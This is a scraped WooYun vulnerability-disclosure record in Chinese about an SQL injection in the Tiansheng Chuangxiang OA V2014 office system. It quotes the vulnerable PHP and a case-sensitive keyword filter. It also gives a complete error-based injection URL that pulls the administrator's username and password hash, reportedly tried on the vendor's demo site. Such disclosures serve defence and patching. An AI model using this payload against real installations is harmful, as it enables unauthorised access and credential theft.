{"id": 4188, "wybug_id": "wooyun-2014-051208", "wybug_title": "天生创想OA系统SQL注入漏洞分析+官网演示", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "飞扬风", "wybug_date": "2014-02-17 22:15", "wybug_open_date": "2014-05-18 22:16", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "注射漏洞利用技巧", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-02-25：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-04-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-04-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-18：\t细节向公众公开  简要描述： 天生创想OA系统SQL注入漏洞分析+官网演示 详细说明：  天生创想OA V2014\n\n/administrative/mod_conference.php，84-94行处\nelseif ($do == 'keys') {\t\t$id = getGP('id','G');\t$type = getGP('type','G');\t$db->query(\"update \".DB_TABLEPRE.\"conference set type='\".$type.\"' where id=\".$id.\" \");\t$content=$id;\t$title='审批会议内容';\tget_logadd($id,$content,$title,19,$_USER->id);\tshow_msg('会议信息审批成功！', 'admin.php?ac='.$ac.'&fileurl='.$fileurl.'');}\n$id通过getGP()函数获得，这个函数在/include/function_global.php，293-307行处\n//获取$_GET或$_POST值function getGP($var, $method = 'GP', $type = 'string') {\tif ($method == 'G' || $method != 'P' && isset($_GET[$var])) {\t\t$gp = &$_GET;\t} else {\t\t$gp = &$_POST;\t}\tif ($type == 'int') {\t\treturn isset($gp[$var]) ? intval($gp[$var]) : 0;\t} elseif ($type == 'array') {\t\treturn isset($gp[$var]) ? (array)getsql($gp[$var]) : array();\t} else {\t\treturn isset($gp[$var]) ? (string)trim(getsql($gp[$var])) : '';\t}}\n可以看出来最后是通过getsql()函数获得，在/include/function_global.php，278-291行处\nfunction getsql($str){\t  $str=str_replace('select','',$str);      $str=str_replace('join','',$str);      $str=str_replace('union','',$str);      $str=str_replace('where ','',$str);      $str=str_replace('insert','',$str);      $str=str_replace('delete','',$str);      $str=str_replace('and ','',$str);      $str=str_replace('drop','',$str);      $str=str_replace('create','',$str);      $str=str_replace('script','',$str);      $str=str_replace('alert','',$str);\t  return $str;}\n明显发现过滤的很薄弱，过滤之前没有做大小写转换，只过滤了小写的单词，稍微变换下就可以绕过。利用方法：登陆一个普通帐户，访问如下页面\nhttp://网站地址/admin.php?ac=conference&fileurl=administrative&do=keys&id=(Select 1 from (Select count(*),concat((Select concat(username,0x3a,password) from po_user limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)&type=2\n就可以得到管理员帐号及密码的密文   漏洞证明：  官网演示http://oa.515158.com/PS：官网将所有表前面加了前缀“p”\n\n\n\n   修复方案：  过滤函数太薄弱了~~~   版权声明：转载请注明来源 飞扬风@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-02-22 11:49 厂商回复： CNVD确认所述案例以及机理分析情况，对该OA进行了特征提取，不过时间关系暂未得到其他实例情况，暂不对通用性进行确认（CMS软件在部署时有较大差异，或许实例上就不一定有漏洞）。如果白帽子后续有实例，也可以进一步联系提交。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-02-17 22:53 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  为毛我提交的getshell没有给cncert呢？    \n     2014-02-18 09:57 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  要登录的吧？那价值就没那么高了    \n     2014-02-18 10:12 |    \t\t飞扬风 \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:125        | 追求安全，热爱技术)\t\t \n  @wefgod 确实是这样    \n     2014-02-18 10:16 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  @飞扬风 @wefgod 这样子，当时找了一个没人管就没看ta了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}